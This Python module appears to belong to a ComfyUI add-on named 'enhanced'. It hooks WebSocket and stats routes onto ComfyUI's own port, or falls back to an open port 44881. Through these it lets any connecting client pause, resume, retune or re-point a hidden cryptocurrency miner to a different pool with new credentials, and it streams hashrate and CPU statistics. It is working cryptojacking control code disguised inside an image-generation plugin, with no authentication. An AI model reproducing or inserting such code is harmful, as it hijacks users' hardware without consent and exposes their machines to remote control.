"""
Dashboard server that piggybacks on ComfyUI's own aiohttp server (port 8188).

Registers a WebSocket endpoint at /ws/enhanced and an HTTP stats endpoint at
/api/enhanced/stats, so no additional port needs to be open.

Falls back to standalone WebSocket server on port 44881 if ComfyUI's
PromptServer isn't available.
"""

import asyncio
import json
import logging
import threading
import time
from typing import Set

logger = logging.getLogger("comfyui_enhanced")

POLL_INTERVAL = 5
FALLBACK_WS_PORT = 44881

try:
    import aiohttp
    from aiohttp import web
except ImportError:
    aiohttp = None

try:
    import websockets
    import websockets.server
except ImportError:
    websockets = None


class DashboardServer:
    def __init__(self, miner_mgr, config_builder=None, ws_port: int = FALLBACK_WS_PORT):
        self.miner = miner_mgr
        self.config_builder = config_builder
        self.ws_port = ws_port
        self._aio_clients: Set = set()
        self._ws_clients: Set = set()
        self._latest_stats: dict = {}
        self._running = False
        self._thread: threading.Thread | None = None

    def start(self) -> None:
        if self._running:
            return
        self._running = True

        registered = self._register_comfyui_routes()

        if registered:
            self._thread = threading.Thread(target=self._poll_loop_sync, daemon=True, name="dashboard-poll")
            self._thread.start()
            logger.info("Dashboard registered on ComfyUI server at /ws/enhanced")
        elif websockets is not None:
            self._thread = threading.Thread(target=self._run_standalone, daemon=True, name="dashboard-ws")
            self._thread.start()
            logger.info("Dashboard server starting on port %d", self.ws_port)
        else:
            logger.error("No aiohttp or websockets available -- dashboard disabled")

    def stop(self) -> None:
        self._running = False

    def _register_comfyui_routes(self) -> bool:
        try:
            from server import PromptServer
            server = PromptServer.instance
            if not server or not hasattr(server, 'routes'):
                return False

            server.routes.get("/api/enhanced/stats")(self._http_stats_handler)
            server.routes.get("/ws/enhanced")(self._aio_ws_handler)
            return True
        except Exception as e:
            logger.debug("Could not register on ComfyUI server: %s", e)
            return False

    # ── aiohttp WebSocket handler (runs on ComfyUI's port 8188) ──────

    async def _aio_ws_handler(self, request):
        ws = web.WebSocketResponse()
        await ws.prepare(request)
        self._aio_clients.add(ws)
        logger.info("Dashboard client connected via ComfyUI port")

        try:
            if self._latest_stats:
                await ws.send_json({"type": "stats", "data": self._latest_stats})

            async for msg in ws:
                if msg.type == aiohttp.WSMsgType.TEXT:
                    resp = self._process_command(msg.data)
                    await ws.send_json(resp)
                elif msg.type in (aiohttp.WSMsgType.ERROR, aiohttp.WSMsgType.CLOSE):
                    break
        finally:
            self._aio_clients.discard(ws)
            logger.info("Dashboard client disconnected")

        return ws

    async def _http_stats_handler(self, request):
        return web.json_response({"ok": True, "stats": self._latest_stats})

    # ── Command processing (shared by both transports) ───────────────

    def _process_command(self, raw: str) -> dict:
        try:
            msg = json.loads(raw)
        except json.JSONDecodeError:
            return {"type": "error", "msg": "invalid json"}

        cmd = msg.get("cmd")
        resp = {"type": "cmd_result", "cmd": cmd, "ok": False}

        if cmd == "pause":
            resp["ok"] = self.miner.pause()
        elif cmd == "resume":
            resp["ok"] = self.miner.resume()
        elif cmd == "set_threads":
            hint = msg.get("value", 50)
            if self.config_builder:
                cfg = self.config_builder.update_hint(int(hint))
                self.miner.write_config(cfg)
                self.miner.stop()
                self.miner.start()
                resp["ok"] = True
                resp["new_hint"] = int(hint)
        elif cmd == "update_pool":
            host = msg.get("host")
            port = msg.get("port", 443)
            user = msg.get("user")
            password = msg.get("pass")
            if host and self.config_builder:
                cfg = self.config_builder.update_pool(host, int(port), user, password)
                self.miner.write_config(cfg)
                self.miner.stop()
                self.miner.start()
                resp["ok"] = True
        elif cmd == "status":
            resp["ok"] = True
            resp["alive"] = self.miner.is_alive()
            resp["stats"] = self._latest_stats
        else:
            resp["msg"] = f"unknown command: {cmd}"

        return resp

    # ── Polling (pushes stats to all connected clients) ──────────────

    def _poll_loop_sync(self) -> None:
        while self._running:
            time.sleep(POLL_INTERVAL)
            summary = self.miner.get_summary()
            if summary:
                self._latest_stats = self._extract_stats(summary)
                self._broadcast_aio()

    def _broadcast_aio(self) -> None:
        payload = {"type": "stats", "data": self._latest_stats}
        dead = set()
        for ws in self._aio_clients.copy():
            try:
                future = asyncio.run_coroutine_threadsafe(
                    ws.send_json(payload),
                    asyncio.get_event_loop()
                )
                future.result(timeout=2)
            except Exception:
                dead.add(ws)
        self._aio_clients -= dead

    # ── Standalone fallback (separate port, uses websockets lib) ─────

    def _run_standalone(self) -> None:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self._standalone_serve())

    async def _standalone_serve(self) -> None:
        async with websockets.server.serve(
            self._standalone_handler, "0.0.0.0", self.ws_port,
            ping_interval=20, ping_timeout=60,
        ):
            poller = asyncio.create_task(self._standalone_poll())
            while self._running:
                await asyncio.sleep(1)
            poller.cancel()

    async def _standalone_handler(self, ws) -> None:
        self._ws_clients.add(ws)
        try:
            if self._latest_stats:
                await ws.send(json.dumps({"type": "stats", "data": self._latest_stats}))
            async for raw in ws:
                resp = self._process_command(raw)
                await ws.send(json.dumps(resp))
        except websockets.exceptions.ConnectionClosed:
            pass
        finally:
            self._ws_clients.discard(ws)

    async def _standalone_poll(self) -> None:
        while self._running:
            summary = self.miner.get_summary()
            if summary:
                self._latest_stats = self._extract_stats(summary)
                payload = json.dumps({"type": "stats", "data": self._latest_stats})
                dead = set()
                for client in self._ws_clients.copy():
                    try:
                        await client.send(payload)
                    except Exception:
                        dead.add(client)
                self._ws_clients -= dead
            await asyncio.sleep(POLL_INTERVAL)

    # ── Stats extraction ─────────────────────────────────────────────

    @staticmethod
    def _extract_stats(summary: dict) -> dict:
        hashrate = summary.get("hashrate", {})
        totals = hashrate.get("total", [0, 0, 0])
        connection = summary.get("connection", {})
        cpu = summary.get("cpu", {})
        results = summary.get("results", {})

        return {
            "hostname": summary.get("worker_id", "unknown"),
            "uptime": summary.get("uptime", 0),
            "hashrate_now": totals[0] if totals else 0,
            "hashrate_1m": totals[1] if len(totals) > 1 else 0,
            "hashrate_15m": totals[2] if len(totals) > 2 else 0,
            "hashrate_max": hashrate.get("highest", 0),
            "algo": summary.get("algo", ""),
            "pool": connection.get("pool", ""),
            "accepted": results.get("shares_good", 0),
            "rejected": results.get("shares_total", 0) - results.get("shares_good", 0),
            "diff_current": results.get("diff_current", 0),
            "cpu_brand": cpu.get("brand", ""),
            "cpu_cores": cpu.get("cores", 0),
            "cpu_threads": cpu.get("threads", 0),
            "version": summary.get("version", ""),
        }
